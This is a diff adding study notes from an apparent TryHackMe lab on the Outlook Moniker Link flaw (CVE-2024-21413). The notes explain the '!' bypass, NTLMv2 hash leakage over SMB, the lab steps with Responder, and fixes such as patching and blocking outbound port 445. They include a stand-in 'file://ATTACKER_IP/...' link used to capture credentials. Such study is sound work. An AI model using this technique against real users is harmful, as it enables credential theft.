@@ -1210,3 +1210,139 @@ ipconfig → Network info
 Linux is dominant in offensive security.
 Windows CMD is important for enterprise defense.
 ```
+
+# Vulnerability Study: Moniker Link (CVE-2024-21413)
+
+> TryHackMe — Quick Revision Notes
+
+---
+
+# The Core Concept (Explain Like I'm 5)
+
+- Outlook is supposed to block dangerous links.
+- Attackers discovered a trick using a special character (`!`) inside a `file://` link.
+- Because of this trick, Outlook incorrectly trusts the link and lets it open.
+- This creates a **security bypass** that can be abused by attackers.
+
+---
+
+# The Twin Risks
+
+## 1. Credential Leak (Main Risk)
+
+- The malicious `file://` link points to an attacker-controlled SMB share.
+- Windows automatically tries to authenticate to that share.
+- During authentication, Windows sends the user's **netNTLMv2 hash**.
+- The attacker captures this hash and may attempt to crack or relay it.
+
+### Remember
+
+```text
+Victim clicks link
+→ Windows connects via SMB
+→ netNTLMv2 hash is sent
+→ Attacker captures hash
+```
+
+---
+
+## 2. Remote Code Execution (RCE)
+
+- The vulnerability can also be abused to execute malicious code remotely.
+- This happens because Windows may process the malicious resource as a **COM (Component Object Model)** object.
+- Successful exploitation can lead to attacker-controlled code execution.
+
+### Remember
+
+```text
+Credential Theft = Most common risk
+
+RCE = More severe impact
+```
+
+---
+
+# The Lab Setup & Attack Steps
+
+## Step 1 — Start Responder
+
+Used **Responder** to listen for incoming SMB authentication attempts.
+
+Purpose:
+
+```text
+Capture victim netNTLMv2 hashes
+```
+
+---
+
+## Step 2 — Modify Exploit PoC
+
+Edited the Python exploit script.
+
+Changed:
+
+```text
+file://ATTACKER_IP/...
+```
+
+to use our AttackBox IP and the special `!` bypass trick inside the hyperlink.
+
+---
+
+## Step 3 — Send Email & Capture Hash
+
+- Sent the crafted email.
+- Opened it in the vulnerable Outlook application.
+- Outlook followed the malicious link.
+- Responder captured the victim's **netNTLMv2 hash**.
+
+---
+
+# How To Fix It
+
+## Fix 1 — Install Microsoft Patch
+
+- Apply the official Microsoft security update.
+- Removes the vulnerability.
+
+---
+
+## Fix 2 — Block Outbound SMB
+
+Block:
+
+```text
+TCP Port 445
+```
+
+at the firewall.
+
+Purpose:
+
+```text
+Prevent SMB connections to attacker-controlled servers
+```
+
+---
+
+# MOST IMPORTANT THINGS TO REMEMBER
+
+```text
+CVE-2024-21413 = Outlook Moniker Link Vulnerability
+
+Special "!" trick bypasses Outlook protections
+
+Main Risk:
+→ netNTLMv2 hash leakage via SMB
+
+Possible Impact:
+→ Remote Code Execution (RCE)
+
+Lab Tool:
+→ Responder
+
+Fixes:
+→ Install Microsoft patch
+→ Block outbound SMB (Port 445)
+```
